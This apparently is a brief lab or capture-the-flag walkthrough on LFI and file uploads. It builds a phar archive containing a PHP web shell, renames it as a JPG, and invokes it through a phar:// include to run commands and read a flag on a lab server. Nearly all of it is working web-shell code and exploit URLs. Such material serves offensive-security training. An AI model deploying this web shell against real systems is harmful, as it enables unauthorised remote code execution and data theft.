# [LFI and File Uploads](LFI%20and%20File%20Uploads.md)
### Use any of the techniques covered in this section to gain RCE and read the flag at /

```php
<?php 
$phar = new Phar('shell.phar'); 
$phar->startBuffering(); 
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>'); 
$phar->setStub('<?php __HALT_COMPILER(); ?>'); 

$phar->stopBuffering();
```
![](Screenshot%202026-07-01%20at%2012.41.31.png)

```shell
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```
![](Screenshot%202026-07-01%20at%2012.44.01.png)

```url
phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
```
![](Screenshot%202026-07-01%20at%2012.45.17.png)
![](Screenshot%202026-07-01%20at%2012.46.43.png)

```url
http://154.57.164.76:31273/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=cat%20/2f40d853e2d4768d87da1c81772bae0a.txt
```
![](Screenshot%202026-07-01%20at%2012.47.14.png)

